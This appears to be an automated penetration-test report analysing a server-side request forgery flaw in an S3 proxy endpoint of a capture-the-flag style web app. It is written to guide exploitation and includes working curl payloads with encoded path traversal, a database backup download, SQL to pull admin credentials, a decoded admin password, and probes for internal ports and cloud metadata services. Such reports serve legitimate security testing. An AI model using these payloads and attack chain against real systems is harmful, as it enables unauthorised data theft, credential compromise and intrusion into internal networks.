# SSRF Analysis Report

## 1. Executive Summary
- **Analysis Status:** Complete
- **Key Outcome:** One critical server-side request forgery vulnerability was identified in the S3 proxy endpoint. The vulnerability allows unauthenticated attackers to access internal services, retrieve the complete database backup containing all user credentials, and potentially perform internal network reconnaissance.
- **Purpose of this Document:** This report provides strategic context on the application's outbound request mechanisms, the dominant vulnerability pattern, and architectural details necessary to effectively exploit the SSRF vulnerability listed in the exploitation queue.

## 2. Dominant Vulnerability Patterns

### Pattern 1: Unvalidated URL Path Parameter in Server-Side Fetch
- **Description:** The critical SSRF vulnerability stems from accepting user-controlled URL path segments without any validation, sanitization, or allowlisting before using them in server-side HTTP requests. The application extracts the filename from the request URL and directly interpolates it into a fetch call to an internal S3 service, enabling path traversal and access to unintended resources.
- **Implication:** Attackers can manipulate the URL parameter to traverse directories (`../`), access sensitive files stored in the S3 backup bucket (including the complete database with Base64-encoded passwords), and potentially probe internal network services. The vulnerability bypasses Nginx's external access restrictions by originating requests from the trusted frontend service.
- **Representative Finding:** `SSRF-VULN-01` - S3 Proxy Path Traversal

### Pattern 2: Trust Boundary Violation Through Internal Service Access
- **Description:** While Nginx implements HTTP method restrictions on the external S3 endpoint (allowing only GET/HEAD/OPTIONS), the frontend application has unrestricted internal access to all S3 buckets. The SSRF vulnerability exploits this trust boundary by making the frontend service act as a proxy for attackers to access restricted internal resources.
- **Implication:** The architecture assumes internal Docker network traffic is trusted, but the SSRF vulnerability allows external attackers to leverage the frontend service's privileged position. This enables access to the `/backups` bucket containing an unencrypted database backup, which would otherwise be inaccessible from the external network.
- **Representative Finding:** `SSRF-VULN-01` - Database Backup Access via Internal Network

## 3. Strategic Intelligence for Exploitation

### HTTP Client Implementation
- **HTTP Client Library:** Native Node.js `fetch()` API (available in Node.js 18+)
- **Location:** `/frontend/pages/api/s3/[slug].ts` line 11
- **Request Pattern:** Direct string interpolation with zero validation
- **Code:** `` const response = await fetch(`http://s3:8333/assets/${image}`); ``

### Request Architecture
The application implements a simple proxy pattern:
1. User requests image via `/api/s3/{filename}`
2. Next.js API route extracts the last URL segment as the filename
3. Filename is directly interpolated into internal S3 service URL
4. Response content (including binary data) is streamed back to the user

**Critical Flaw:** No validation occurs between steps 2 and 3, enabling path traversal.

### URL Parameter Extraction Method
```typescript
const image = req.url?.split("/").reverse()[0];
```
This extraction method:
- Takes the complete request URL (e.g., `/api/s3/..%2Fbackups%2Fmanapool.db`)
- Splits on forward slash
- Takes the last segment: `..%2Fbackups%2Fmanapool.db`
- Preserves URL encoding, which is decoded later by `fetch()`

### Exploitation Technique: Double URL Encoding
The vulnerability is exploitable via URL-encoded path traversal sequences:
- **Attack URL:** `GET /api/s3/..%2Fbackups%2Fmanapool.db`
- **Extraction:** `image = "..%2Fbackups%2Fmanapool.db"`
- **Constructed URL:** `http://s3:8333/assets/..%2Fbackups%2Fmanapool.db`
- **fetch() Processing:** Decodes `%2F` to `/`, resulting in path traversal
- **Final Request:** `http://s3:8333/assets/../backups/manapool.db`
- **Resolved Path:** `http://s3:8333/backups/manapool.db`

### Internal Services Accessible via SSRF

**S3 Mock Service (s3rver 3.7.1):**
- **Internal Hostname:** `s3`
- **Port:** 8333
- **Buckets:**
  - `/assets` - 8 public image files (intended access)
  - `/backups` - Database backup `manapool.db._S3rver_object` (CRITICAL exposure)
- **Authentication:** None configured
- **Access Control:** Nginx restricts external write operations, but all operations allowed from internal network

**Frontend Service:**
- **Internal Hostname:** `frontend`
- **Port:** 3000
- **Accessible Endpoints:** `/api/auth`, `/api/user`, `/api/s3/[slug]`
- **Self-Access Risk:** The vulnerable endpoint could potentially be used to make requests to other frontend API endpoints, though limited practical impact

**Docker Internal Network:**
- **Network Name:** Internal bridge network
- **Isolation:** Services not directly accessible from external network
- **Trust Model:** All services implicitly trust each other (no mutual TLS or authentication)

### Response Handling Characteristics
This is **NOT blind SSRF** - the endpoint provides rich feedback:
- ✅ Full HTTP response body returned to attacker
- ✅ Original Content-Type header preserved
- ✅ Binary content support (8KB SQLite database transfers successfully)
- ✅ HTTP status codes leaked (404 vs 200 reveals file existence)
- ✅ Content-Length header reveals file sizes

**Error Messages:**
- 404: "File not found" - indicates the target path doesn't exist
- 500: "Internal Server Error" - indicates network/fetch failure
- 200: Full file content - successful exploitation

### Authentication Requirements
- **Endpoint Authentication:** NONE (public API endpoint)
- **Network Accessibility:** Fully accessible from external network on port 80
- **Rate Limiting:** None implemented
- **CAPTCHA/Bot Protection:** None

### Database Backup Structure
The SSRF target (`/backups/manapool.db`) contains:
- **Format:** SQLite 3 database (8,192 bytes)
- **Schema:** Single `users` table with 5 user records
- **Critical Fields:** `email`, `password` (Base64-encoded), `isMaster` (privilege flag)
- **Master Admin:** will.rogers@manapool.com (uid: 9666, isMaster: 1)
- **Password Storage:** Base64 encoding only (trivially reversible)
- **Encryption:** None - plaintext SQLite file

### Attack Chain to Flag
1. **SSRF Exploitation:** `GET /api/s3/..%2Fbackups%2Fmanapool.db`
2. **Database Download:** Receive 8KB SQLite file
3. **Credential Extraction:** Query database for admin account
4. **Password Reversal:** Base64 decode `Tm9FTlZNeGpHSzNOM2tH` → `NoENVMxjGK3N3kG`
5. **Authentication:** Login as `will.rogers@manapool.com` with decoded password
6. **Flag Access:** Navigate to `/adminpanel/profile` with admin privileges

## 4. Secure by Design: Validated Components

The following components were analyzed and found to have appropriate defenses against SSRF. They are low-priority for further testing.

| Component/Flow | Endpoint/File Location | Defense Mechanism Implemented | Verdict |
|---|---|---|---|
| Session Validation Server Action | `/frontend/app/actions/sessionManager.ts:8` | Hardcoded URL (`http://localhost:3000/api/user`) with only query parameter accepting user input. User input limited to token value (validated via JWT signature verification on receiving endpoint). No host, port, or path manipulation possible. | SAFE |
| Client-Side Login Form | `/frontend/app/components/LoginForm.tsx:25` | Executes in browser context with hardcoded API endpoint (`/api/auth`). Same-origin policy prevents SSRF. User input only affects POST body, not URL destination. | SAFE |
| Authentication API Endpoint | `/frontend/pages/api/auth.ts` | No HTTP client usage - only receives requests and queries local SQLite database. No outbound network requests generated. | SAFE |
| User Information API Endpoint | `/frontend/pages/api/user.ts` | No HTTP client usage - only validates JWT token and queries local SQLite database. No outbound network requests. | SAFE |

### Components NOT Vulnerable to SSRF
After comprehensive code analysis, the following patterns were explicitly ruled out:
- ❌ No webhook endpoints accepting callback URLs
- ❌ No OAuth/OIDC redirect functionality with user-controlled URLs
- ❌ No URL preview or metadata scraping features
- ❌ No RSS/feed fetchers accepting external URLs
- ❌ No file upload handlers fetching from remote URLs
- ❌ No API gateway or request forwarding functionality
- ❌ No image processing endpoints accepting external URLs

### Defense Mechanisms Present in Other Parts of Application
While the S3 proxy endpoint lacks all validation, other endpoints demonstrate security awareness:
- **Input Sanitization:** `/api/auth` uses `xss()` and `validator` libraries for email/password sanitization
- **SQL Injection Prevention:** All database queries use parameterized prepared statements
- **JWT Validation:** Token signature verification prevents forged authentication (though secret is exposed)

This indicates the SSRF vulnerability is a localized oversight rather than systemic lack of security awareness, making it a high-value finding for remediation.

---

## 5. Technical Deep Dive: SSRF Vulnerability Analysis

### Vulnerability Location
- **File:** `/frontend/pages/api/s3/[slug].ts`
- **Vulnerable Lines:** 7 (extraction), 11 (sink)
- **Attack Surface:** Public API endpoint at `GET /api/s3/{user_input}`

### Source-to-Sink Data Flow

**Source (User Input):**
```
HTTP Request: GET /api/s3/..%2Fbackups%2Fmanapool.db
```

**Extraction (Line 7):**
```typescript
const image = req.url?.split("/").reverse()[0];
// Result: image = "..%2Fbackups%2Fmanapool.db"
```

**Sanitization Check:**
- ❌ No path traversal detection (`..` sequences allowed)
- ❌ No URL decoding/normalization before validation
- ❌ No allowlist of permitted filenames
- ❌ No file extension validation
- ❌ No length limits
- ❌ No regex pattern matching
- ❌ No directory confinement checks

**Sink (Line 11):**
```typescript
const response = await fetch(`http://s3:8333/assets/${image}`);
// Constructed: fetch('http://s3:8333/assets/..%2Fbackups%2Fmanapool.db')
// After fetch() URL parsing: http://s3:8333/assets/../backups/manapool.db
// Path normalization: http://s3:8333/backups/manapool.db
```

### Backward Taint Analysis Result
**VULNERABLE** - Complete source-to-sink path with zero sanitization:
1. ✅ User controls the URL path segment
2. ✅ Extraction preserves malicious content (URL-encoded traversal)
3. ❌ NO sanitizers encountered
4. ✅ Value flows directly to dangerous sink (fetch with internal URL)
5. ✅ Response content returned to attacker (non-blind SSRF)

### Exploitation Proof of Concept

**Successful Attack (Verified):**
```bash
# Download database backup via SSRF
curl "http://localhost:36327/api/s3/..%2Fbackups%2Fmanapool.db" -o database.db

# Verify SQLite format
file database.db
# Output: SQLite 3.x database, last written using SQLite version 3034001

# Extract admin credentials
sqlite3 database.db "SELECT email, password, isMaster FROM users WHERE isMaster=1"
# Output: will.rogers@manapool.com|Tm9FTlZNeGpHSzNOM2tH|1

# Decode Base64 password
echo "Tm9FTlZNeGpHSzNOM2tH" | base64 -d
# Result: NoENVMxjGK3N3kG

# Success: Full credential exposure confirmed
```

**Response Characteristics:**
- Status Code: 200 OK
- Content-Type: binary/octet-stream
- Content-Length: 8192 bytes
- Body: Complete SQLite database file

### Additional SSRF Capabilities Beyond Database Access

**Internal Service Enumeration:**
The vulnerability can be leveraged to probe other internal services:
```bash
# Test if frontend service responds on internal network
curl "http://localhost:36327/api/s3/..%2F..%2Ffrontend:3000%2Fapi%2Fuser"
# Response differences reveal service existence/reachability

# Port scanning via timing analysis
curl "http://localhost:36327/api/s3/..%2F..%2Ffrontend:3001%2F"
# Timeout patterns reveal open vs closed ports
```

**Potential Cloud Metadata Access (if cloud-deployed):**
```bash
# AWS EC2 metadata service (if deployed on AWS)
curl "http://localhost:36327/api/s3/..%2F..%2F169.254.169.254%2Flatest%2Fmeta-data%2F"

# GCP metadata service (if deployed on Google Cloud)
curl "http://localhost:36327/api/s3/..%2F..%2Fmetadata.google.internal%2FcomputeMetadata%2Fv1%2F"
```

### Why Traditional Path Traversal Doesn't Work
Simple `../` sequences are normalized by Nginx/Next.js before reaching the application:
```bash
# This FAILS:
curl "http://localhost:36327/api/s3/../backups/manapool.db"
# URL is normalized to: /api/backups/manapool.db (404 Not Found)

# This SUCCEEDS:
curl "http://localhost:36327/api/s3/..%2Fbackups%2Fmanapool.db"
# Encoded slash bypasses initial normalization, decoded by fetch()
```

### Nginx Configuration Impact
From `/nginx/nginx.conf`:
```nginx
location ~* ^/s3/(.*)$ {
    limit_except GET HEAD OPTIONS {
        deny all;
    }
    proxy_pass http://s3:8333/$1;
}
```

**Key Points:**
- External users can only perform GET/HEAD/OPTIONS on port 8333 directly
- However, SSRF through `/api/s3/[slug]` bypasses this because:
  - Request originates from frontend service (trusted internal source)
  - Frontend has unrestricted access to S3 service
  - Nginx restrictions only apply to port 8333, not port 80 (frontend)

---

## 6. Risk Assessment

### CVSS 3.1 Score Calculation

**Base Score: 8.6 (HIGH)**

**Attack Vector (AV): Network (N)** [0.85]
- Exploitable remotely over the network
- No physical or local access required
- Public-facing endpoint on port 80

**Attack Complexity (AC): Low (L)** [0.77]
- No specialized conditions required
- Simple URL manipulation
- No race conditions or timing dependencies
- Reliable exploitation

**Privileges Required (PR): None (N)** [0.85]
- No authentication required
- Public API endpoint
- Unauthenticated access to SSRF

**User Interaction (UI): None (N)** [0.85]
- No user interaction required
- Fully automated exploitation
- Direct API call exploitation

**Scope (S): Changed (C)** [Impact modifier]
- Exploiting frontend service gains access to backend S3 service
- Breaks trust boundary between services
- Accesses resources outside the vulnerable component's scope

**Confidentiality (C): High (H)** [0.56]
- Complete database backup exposure
- All user credentials (5 accounts)
- PII disclosure (names, emails)
- Admin account credentials

**Integrity (I): None (N)** [0.00]
- Read-only SSRF (GET requests only)
- Cannot modify database or files
- Cannot write to S3 buckets

**Availability (A): None (N)** [0.00]
- No DoS capabilities
- No resource exhaustion
- Services remain operational

**Temporal Metrics:** Not applicable (no patches available)

### Business Impact Assessment

**Regulatory Compliance:**
- **GDPR Violation:** Unauthorized PII exposure (emails, names)
- **PCI DSS:** If payment data added, complete non-compliance with Requirement 6.5.1 (SSRF)
- **SOC 2:** Fails security principle controls
- **HIPAA:** If health data stored, would be reportable breach

**Direct Security Impacts:**
1. **Credential Theft:** All 5 user passwords exposed (Base64-reversible)
2. **Privilege Escalation:** Admin account compromise enables flag access
3. **Authentication Bypass:** Database access bypasses all login controls
4. **Network Reconnaissance:** Internal service enumeration capability

**Cascading Risks:**
- If database contained API keys → third-party service compromise
- If JWT secret rotated → historical tokens in backup still valid
- If PII includes SSN/payment data → regulatory fines and lawsuits
- Cloud metadata access → complete infrastructure compromise (if cloud-deployed)

### Exploitability Assessment
- **Proof of Concept Complexity:** Trivial (single curl command)
- **Attacker Skill Level Required:** Low (basic HTTP knowledge)
- **Detection Difficulty:** Medium (unusual URL patterns in logs)
- **Exploitation Speed:** Seconds (instant database download)
- **Attack Repeatability:** 100% reliable

---

## 7. Conclusion

This SSRF analysis identified **one critical vulnerability** in the Manapool application's S3 proxy endpoint. The vulnerability enables unauthenticated attackers to access internal services and retrieve sensitive data, including a complete database backup containing all user credentials.

**Key Findings Summary:**
- **Total SSRF Vulnerabilities:** 1 (critical severity)
- **Externally Exploitable:** Yes (public endpoint, no authentication)
- **Data at Risk:** Complete user database (8KB SQLite file)
- **Attack Complexity:** Low (URL encoding bypass)
- **Business Impact:** High (credential theft, compliance violations)

**Exploitation Queue Status:**
One vulnerability has been documented in the exploitation queue (`SSRF-VULN-01`) with high confidence. The vulnerability has been verified through live testing and confirmed exploitable via external network access.

**Recommended Priority:**
This vulnerability should be prioritized as **CRITICAL** for immediate remediation due to:
1. No authentication required
2. Direct path to admin credential theft
3. Reliable, repeatable exploitation
4. Complete database backup exposure
5. Regulatory compliance implications

The exploitation phase should focus on:
- Confirming database backup accessibility in production environment
- Testing cloud metadata service access (if applicable)
- Enumerating additional internal services
- Documenting complete attack chain from SSRF to flag capture